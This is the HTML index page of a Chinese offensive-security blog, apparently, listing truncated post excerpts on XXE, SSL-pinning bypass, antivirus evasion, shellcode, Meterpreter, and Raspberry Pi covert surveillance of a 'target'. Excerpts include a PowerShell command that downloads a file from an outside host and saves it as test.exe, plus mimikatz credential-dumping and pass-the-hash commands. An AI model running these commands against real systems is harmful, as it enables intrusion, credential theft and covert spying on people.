XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 外部实体 ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(盯好外部实体就行了)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）

基础知识
XML是一种用于标记电子文件使其具有结构性的标记 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/07/23/InformationGathering/" title="信息收集总结"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/109.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="信息收集总结"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/23/InformationGathering/" title="信息收集总结">信息收集总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-23T13:45:42.000Z" title="发表于 2020-07-23 21:45:42">2020-07-23</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

对没错这是这星期的第三篇文章了，目前只写了个GitHub的使用方法，等周六周天补充吧
Github搜索语法
众所周知，GitHub就是信息泄露的宝库之一，用好语法天天高危来敲你家门（逃
相关语法
查询大于或小于另一个值的值
您可以使用&gt;，&gt;=，&lt;，和&lt;=搜索是大于，大于或等于，小于和小于或等于另一个值的值。



查询
示例




&gt;n
cats stars:&gt;1000 匹配含有 “cats” 字样、星标超过 1000 个的仓库。


&gt;=n
cats topics:&gt;=5 匹配含有 “cats” 字样、有 5 个或更多主题的仓库。


&lt;n
cats size:&lt;10000 匹配小于 10 KB 的文件中含有 “cats” 字样的代码。


&lt;=n
cats stars:&lt;=50 匹配含有 “cats” 字样、星标不超过 50 个的仓库。


 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/20/HttpCertificate/" title="解决安卓单向/双向认证导致无法抓包"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/107.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="解决安卓单向/双向认证导致无法抓包"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/20/HttpCertificate/" title="解决安卓单向/双向认证导致无法抓包">解决安卓单向/双向认证导致无法抓包</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-20T12:45:53.000Z" title="发表于 2020-07-20 20:45:53">2020-07-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.837Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%8A%93%E5%8C%85/">抓包</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/">双向认证</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81/">单向认证</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

本文思路来着公众号小和尚的安全之路，菜鸡的我周天面试被社会毒打了一顿，问了双向认证问题，但是这玩意我没接触过，刚好今天看到一篇文章，学习一下

首先准备工作

XposedInstaller（Xposed安装器）
JustTrustMe（禁用SSL）
ida pro（静态逆向程序）
JEB（apk解包程序）
test.apk（目标程序）

所需文件位置下载
https://github.com/Ascotbe/virus/blob/master/HttpCertificate
解决单向认证
安装Xposed框架
刚开始安装好APK是显示框架未安装的

点击这个安装

xuanz安装

接着点击安装

然后从起后就能看到安装成功了

安装JustTrusMe模块

点击左上角的菜单

然后选着模块

勾选就好了，这样就解决了单向认证，可以绕过客户端校验了
解决双向认证
我们来把目标程序抓个包

可以看到服务器显示为400 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/07/12/RemoteDownload/" title="利用系统组件远程下载木马"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/106.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用系统组件远程下载木马"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/12/RemoteDownload/" title="利用系统组件远程下载木马">利用系统组件远程下载木马</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-12T07:45:42.000Z" title="发表于 2020-07-12 15:45:42">2020-07-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD/">远程下载</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
我知道上篇文章没有写完，但是把看到什么学什么，要终结的嘛你说是吧（ps:后续有其他方法也会更新到这里的

Windows
命令行自带工具
PowerShell
PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的 shell 不同，PowerShell构建在 .NET公共语言运行时 (CLR) 的基础之上，接受并返回.NET对象，这从根本上的改变引入了全新的自动化工具和方法。
远程下载文件到本地：
powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.183.138:8000/test.txt&#x27;,&#x27;test.exe&#x27;)

直接把文本转换为exe文件运行，无残留文件
powershell -nop -w hidden -c &qu ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/05/PortableExecutableParser/" title="PE解析器"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/104.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="PE解析器"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/05/PortableExecutableParser/" title="PE解析器">PE解析器</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-05T12:45:53.000Z" title="发表于 2020-07-05 20:45:53">2020-07-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.436Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PE/">PE</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
之前为了学习PE结构知识恶补了一下相关文章，然后使用010 Editor这个软件也可以完整的读取出PE的结构和字段，但是这都是别人写好的，自己没有玩过一遍的东西都不叫学过，那只能叫见过所以就有了这篇文章，各位看官别急需要几天时间才能搞定，毕竟还不熟悉如果有哪里写错了，忘各位斧正！（PS：当前代码输出不够美观后期会修改）
使用环境

Visual Studio 2019 （宇宙最强编译器
windows 10

前置知识
恶意程序研究之PE结构梳理
获取文件映象
首先介绍下内存映射文件技术作用

使用内存映射文件来访问磁盘上的数据文件。这使你可以不必对文件执行I/O操作，并且可以不必对文件内容进行缓存.
可以使用内存映射文件，使同一台计算机上运行的多个进程能够相互之间共享数据。windows确实提供了其他一些方法，以便在进程之间进行数据通信，但是这些方法都是使用内存映射文件来实现的，诸如使用SendMessage或者Post ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/05/21/BypassTheVirtualMachine/" title="木马绕过虚拟机"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/101.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="木马绕过虚拟机"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/21/BypassTheVirtualMachine/" title="木马绕过虚拟机">木马绕过虚拟机</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-21T15:00:00.000Z" title="发表于 2020-05-21 23:00:00">2020-05-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%97%85%E6%AF%92/">病毒</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BB%95%E8%99%9A%E6%8B%9F%E6%9C%BA/">绕虚拟机</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/CobaltStrike/">CobaltStrike</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
新篇章开始了，主要讲一些探测沙盒以及编译工具的方法，之前我写的那个勒索病毒用到的大部分方法我都会总结到这里，也会参考一些师傅的文章，算是一个巩固吧，最后会把所有代码上传到GitHub中，之前免杀里面说的一些像加密之类的操作这里就不在重复写了。

这是半成品，还有几个代码没敲完，还有点瑕疵
从编译角度来看免杀
全篇文章以免杀中的VirtualAllocPlanA作为基础例子来验证我们的猜想，
删除链接库
有些反病毒软件会识别链接器中的问题，如果说xxx.lib这些编译器会自动帮我们加上，如果把链接器选项中的其他依赖项删除掉(尤其是kernel32.lib)，某些反恶意软件引擎就不会把生成的可执行文件标记为恶意的。
这是系统自带的附加依赖，我们生产后放到TV中查杀看看

可以看到免杀率为28/72

接着把附加依赖项删除了，重新生成

可以看到我们绕过了5家杀软，免杀率23/72

知道PE原理的小伙伴可能会说把这个删了文件就 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/06/MeterpreterCommand/" title="Meterpreter后渗透常用命令"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/100.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Meterpreter后渗透常用命令"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/06/MeterpreterCommand/" title="Meterpreter后渗透常用命令">Meterpreter后渗透常用命令</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-06T15:45:42.000Z" title="发表于 2020-05-06 23:45:42">2020-05-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Meterpreter/">Meterpreter</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
写免杀的时候在想，msf连上后能干啥？之前只有大概的了解下，具体没怎么实操，后面把之前写的文章过了一遍，然后谷歌了一下发现还有好多不知道的地方借此删除了去年写的那篇文章合并到了一起，本篇会持续更新，如果看到师傅们有什么新奇的操作都会记录下来

Metasploit体系框架

文件目录解析
核心文件包括data、modules、scripts、tools、plugins
data
该文件里常用的的功能在wordlists（字典）里面
modules
该文件夹里包括了msf最核心的几个文件
auxiliary（漏洞辅助模块一般是没有攻击载荷的漏洞攻击)Exploits（渗透攻击模块)st（开发模块）pads（漏洞负载模块)Encode码器模块）Nops（空指令模块&gt;
scripts
该文件夹里面包含这各种脚本
tools
该文件夹中存放着大量的使用工具
plugins
该文件夹放着大量插件
系统命令
基本系统命令
ses ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/04/18/ShellCode/" title="自定义ShellCode"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/93.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="自定义ShellCode"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/18/ShellCode/" title="自定义ShellCode">自定义ShellCode</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-18T15:07:46.000Z" title="发表于 2020-04-18 23:07:46">2020-04-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.817Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/ShellCode/">ShellCode</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
终于写完了，应该挺详细的，奥利给

环境配置讲解
当前项目使用的vs2019，其他vs编译器都可以
清除多余的函数
首先创建一个项目，然后什么配置都不修改使用release生成如下代码
int main()&#123;	return 0;&#125;
然后我们把生成的exe文件放到ida里面去可以看到下图，明明我们什么函数都没有加为什么会多出这么多函数呢？

其实这些函数都是vs编译器自动帮我加进去的，我们的代码段加上这些函数就组成了一个PE文件
位置：项目-&gt;配置属性-&gt;高级-&gt;入口点中添加MyMian字段，这个字段可以随意修改
接着我们把原先的代码替换为如下代码，然后重新生成
int MyMain()&#123;	return 0;&#125;

可以看到多余的函数都不见了
禁用安全检查
上面是不是还有一个多余函数，该函数是用于安全检查用的，我们一样可以关闭它。
位置：项目-&gt;配置属性-&gt; ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/04/14/Mimikatz/" title="mimikatz使用说明"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/92.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="mimikatz使用说明"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/14/Mimikatz/" title="mimikatz使用说明">mimikatz使用说明</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-14T15:07:46.000Z" title="发表于 2020-04-14 23:07:46">2020-04-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/mimikatz/">mimikatz</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

只记录自己用过的命令
常用的命令

常规抓hash

privilege::debugsekurlsa::logonpasswords 

注册列表抓hash

reg save HKLM\SYSTEM SYSTEMreg save HKLM\SAM SAMlsadump::sam /sam:SAM /system:SYSTEM

PTH登录

sekurlsa::pth /user:administrator /domain:ascotbe.com /ntlm:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXdir \\10.0.0.1\c$

procdump

有些情况下🥝是无法抓取到hash的，会提示ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)错误，可以使用procdump64+mimikatz来解决，前提是wi ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/03/31/raspberry_monitor_0x02/" title="利用树莓派来监听任务目标(下)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/90.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用树莓派来监听任务目标(下)"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/31/raspberry_monitor_0x02/" title="利用树莓派来监听任务目标(下)">利用树莓派来监听任务目标(下)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-31T14:57:46.000Z" title="发表于 2020-03-31 22:57:46">2020-03-31</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

距离上次的上篇已经过去了小半年时间了，真的不是我咕咕了，是因为自己挖的坑有点多，本片文章主要介绍的是如何对人脸进行检测和检测后的通讯方式，树莓派zeor w性能有点更不上所以我又买了4B（小声BB可能还有终篇


硬件清单


读卡器以及 SD 卡
树莓派官方摄像头一枚（夜视版
树莓派4B
电源(实际场景需要装个充电宝或者使用定制的电源)
监听模块(如果想要带上声音可以装个)


安装python-opencv

更新树莓派系统
在这之前记得话pip源 、apt源、系统更新源换成国内的，并且使用树莓派4并且刷入最新版的包，刷入包的哈希值
SHA-256:c9c382b659bd96b859ccb9e2ac0c2292a91a37c286ab464f2f380d451077663d
sudo apt-get updatesudo apt-get upgrade
安装python-OpenCV
在这之前还需要把系统自带的p ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/03/23/PortableExecutable/" title="Windows PE结构解析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/89.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Windows PE结构解析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/23/PortableExecutable/" title="Windows PE结构解析">Windows PE结构解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-23T15:45:42.000Z" title="发表于 2020-03-23 23:45:42">2020-03-23</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PE/">PE</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
不管你是逆向领域，还是开发领域，异或是病毒编写者（红蓝对抗），都需要对PE文件有详细的了解，由于自己是个菜逼然后需要用到修改PE结构来达到某些免杀的操作，既然这样我就祭出菜逼大杀器Google百度来自行学习，本篇文章主要都是摘抄各位师傅们的文章，加上菜逼我的理解混合在一起的，如果有哪些地方理解错了或者填错了请各位师傅斧正！！

总体介绍
可执行文件(Executable File)是指可以由操作系统直接加载执行的文件，在Windows操作系统中可执行文件就是PE文件结构，在Linux下则是ELF文件，下面这张图就是PE文件格式的图片(来自看雪)，非常大一张图片，其实PE格式就是各种结构体的结合，Windows下PE文件的各种结构体在WinNT.h这个头文件中，可以在VS（宇宙无敌第一编译器）中查询。

PE文件整体结构
PE结构可以大致分为:

DOS部分
PE文件头
节表(块表)
节数据(块数据)
调试信息

依旧用看雪 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/03/16/C++NamingConvention/" title="C++命名规范"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/88.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++命名规范"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/16/C++NamingConvention/" title="C++命名规范">C++命名规范</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-16T13:45:42.000Z" title="发表于 2020-03-16 21:45:42">2020-03-16</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-07T10:53:30.675Z" title="更新于 2022-12-07 18:53:30">2022-12-07</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/">C++命名规范</a></span></div><div class="content">前言
首先命名要可读，这是所有规则的公理！！！！！尽可能使用描述性的命名, 别心疼空间, 毕竟相比之下让代码易于新读者理解更重要. 不要用只有项目开发者能理解的缩写, 也不要通过砍掉几个字母来缩写单词。
本篇作为学习笔记，约束自己
文件命名
文件名全部都要小写并且包含下划线(_)
可接受的文件命名示例:

my_useful_class.cc
http_server_logs.h

C++ 文件要以 .cc 结尾, 头文件以 .h 结尾. 专门插入文本的文件则以 .inc 结尾
通常应尽量让文件名更加明确. http_server_logs.h 就比 logs.h 要好
类型命名
类型名称的每个单词首字母均大写, 不包含下划线: MyExcitingClass, MyExcitingEnum.
变量命名


普通变量命名
单词全小写并且用下划线(_)隔开，和文件命名类似，必须要让命名可读，并且明确。
string table_name;string user_name_read;


类数据成员
再普通的变量名前面加上c_作为开头
class TableInfo &#123;  ... ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/03/07/Basics/" title="免杀基础"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/2.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="免杀基础"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/07/Basics/" title="免杀基础">免杀基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-07T13:45:42.000Z" title="发表于 2020-03-07 21:45:42">2020-03-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%97%85%E6%AF%92/">病毒</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/CobaltStrike/">CobaltStrike</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Metasploit/">Metasploit</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
踩着大佬们的脚步，用自己蹩脚的C++功底复现了师傅给出的一些免杀方案。后续将给出自己的两个免杀方案，复现大佬们的这几个方案用了3天时间，我真的是菜的可怜。

生成ShellCode的方法


使用msfvenom生成的ShellCode


使用参数说明
-l, --list            &lt;type&gt;     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all-p, --payload         &lt;payload&gt;  要使用的有效载荷-f, --format          &lt;format&gt;   输出格式,输出的语言类型-e, --encoder         &lt;encoder&gt;  要使用的编码器- ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/12/21/raspberry_monitor_0x01/" title="利用树莓派来监听任务目标(上)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/33.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用树莓派来监听任务目标(上)"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/21/raspberry_monitor_0x01/" title="利用树莓派来监听任务目标(上)">利用树莓派来监听任务目标(上)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-21T04:57:46.000Z" title="发表于 2019-12-21 12:57:46">2019-12-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.458Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

&quot;黑客&quot;注重的是隐蔽高效的攻陷目标，那么前期的信息收集，以及踩点就是非常重要的了，如何使用树莓派来&quot;监控&quot;目标对象？
当你想知道某个地方的他在做什么？想要知道家里面是否进了小偷？
家里的那个她是否给你带了绿帽子？（写到这里我哭了出来，为什么我没有女朋友！哇~）


硬件清单


读卡器以及 SD 卡
摄像头一枚
SSH连接工具
域名一个
带公网服务器一台
电源(实际场景需要装个充电宝或者使用定制的电源)
监听模块(如果想要带上声音可以装个)

成品图是这样的

刷系统以及换源之类的可以看我另一篇文章，这里就不做其他概述了！

开启摄像头模块

进入配置中
sudo raspi-config
选择Interfacing Options

接着选择Camera

然后他问会问你是否同意使用pi camera，选择是重启就好了
重启后查看监控模块是否开启了，如何和乡土一样就表示没问题了 ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont 